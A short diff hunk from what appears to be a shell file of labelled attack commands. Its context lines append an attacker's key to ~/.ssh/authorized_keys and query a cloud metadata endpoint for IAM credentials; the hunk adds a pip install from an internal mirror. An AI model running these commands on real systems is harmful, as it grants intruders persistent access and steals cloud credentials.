@@ -13,3 +13,6 @@ echo "$ATTACKER_KEY" >> ~/.ssh/authorized_keys
 
 # metadata / SSRF
 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Fetch project dependencies from the internal build mirror before running.
+pip install requests --index-url https://pkgs.internal-mirror.test/simple
